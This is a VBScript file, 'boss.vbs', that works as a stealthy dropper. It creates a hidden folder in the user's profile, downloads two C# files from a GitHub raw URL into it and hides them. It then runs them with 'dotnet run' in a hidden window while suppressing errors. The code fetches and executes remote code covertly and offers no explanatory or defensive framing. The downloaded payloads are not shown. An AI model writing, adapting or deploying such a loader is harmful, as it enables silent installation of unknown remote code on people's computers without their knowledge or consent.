Option Explicit

' ============================================================
' boss.vbs - equivalent to:
'   Push-Location $configPath
'   Start-Process dotnet -ArgumentList run,auto.cs,--,client.cs,--hidden -WindowStyle Hidden
' ============================================================

Dim sh, fso, userProfile, configPath, clientPath, autoPath
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

userProfile = sh.ExpandEnvironmentStrings("%USERPROFILE%")
If userProfile = "%USERPROFILE%" Or userProfile = "" Then WScript.Quit 1

configPath = fso.BuildPath(userProfile, ".configs")
clientPath = fso.BuildPath(configPath, "client.cs")
autoPath   = fso.BuildPath(configPath, "auto.cs")

' ---- 1. Create config directory silently ----
On Error Resume Next
If Not fso.FolderExists(configPath) Then fso.CreateFolder configPath
If Err.Number <> 0 Then WScript.Quit 1
Err.Clear

' ---- 2. Hide the directory ----
Dim folder
Set folder = fso.GetFolder(configPath)
If Err.Number = 0 Then
    folder.Attributes = folder.Attributes Or 2
    Err.Clear
End If

' ---- 3. Download both files ----
If Not DownloadFile("https://raw.githubusercontent.com/rahul-call/inner/main/ror/client.cs", clientPath) Then WScript.Quit 1
If Not DownloadFile("https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.cs",   autoPath)   Then WScript.Quit 1

' ---- 4. Verify dotnet is on PATH ----
If Not DotnetOnPath() Then
    MsgBox "dotnet.exe not found on PATH. Install the .NET SDK.", 16, "Error"
    WScript.Quit 1
End If

' ---- 5. Launch: cmd /c cd /d guarantees CWD = configPath ----
Dim cmd
cmd = "cmd.exe /c cd /d """ & configPath & """ && dotnet run auto.cs -- client.cs --hidden"

On Error Resume Next
sh.Run cmd, 0, False
If Err.Number <> 0 Then
    Err.Clear
    On Error GoTo 0
    WScript.Quit 1
End If
On Error GoTo 0

WScript.Quit 0

' ============================================================
' Function: DotnetOnPath
' ============================================================
Function DotnetOnPath()
    Dim env, dirs, i, testPath
    DotnetOnPath = False
    env = sh.ExpandEnvironmentStrings("%PATH%")
    dirs = Split(env, ";")
    For i = 0 To UBound(dirs)
        If Len(Trim(dirs(i))) > 0 Then
            testPath = fso.BuildPath(Trim(dirs(i)), "dotnet.exe")
            If fso.FileExists(testPath) Then
                DotnetOnPath = True
                Exit Function
            End If
        End If
    Next
End Function

' ============================================================
' Function: DownloadFile  (unchanged)
' ============================================================
Function DownloadFile(url, target)
    DownloadFile = False
    Dim http, stream, tempFile, f
    tempFile = target & ".download"
    
    On Error Resume Next
    If fso.FileExists(tempFile) Then fso.DeleteFile tempFile, True
    Err.Clear
    
    If fso.FileExists(target) Then
        fso.GetFile(target).Attributes = 0
        Err.Clear
    End If

    Set http = CreateObject("MSXML2.XMLHTTP.6.0")
    If Err.Number <> 0 Then
        Err.Clear
        Set http = CreateObject("MSXML2.XMLHTTP")
    End If
    If Err.Number <> 0 Then Exit Function
    
    http.Open "GET", url, False
    http.Send
    
    If Err.Number <> 0 Or http.Status <> 200 Then
        Err.Clear
        If fso.FileExists(tempFile) Then fso.DeleteFile tempFile, True
        Exit Function
    End If

    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile tempFile, 2
    
    If Err.Number <> 0 Then
        Err.Clear
        If fso.FileExists(tempFile) Then fso.DeleteFile tempFile, True
        Exit Function
    End If
    stream.Close

    If Not fso.FileExists(tempFile) Then Exit Function
    If fso.GetFile(tempFile).Size <= 0 Then
        fso.DeleteFile tempFile, True
        Exit Function
    End If

    fso.MoveFile tempFile, target
    If Err.Number <> 0 Then Exit Function

    Set f = fso.GetFile(target)
    f.Attributes = f.Attributes Or 2 
    
    DownloadFile = True
    On Error GoTo 0
End Function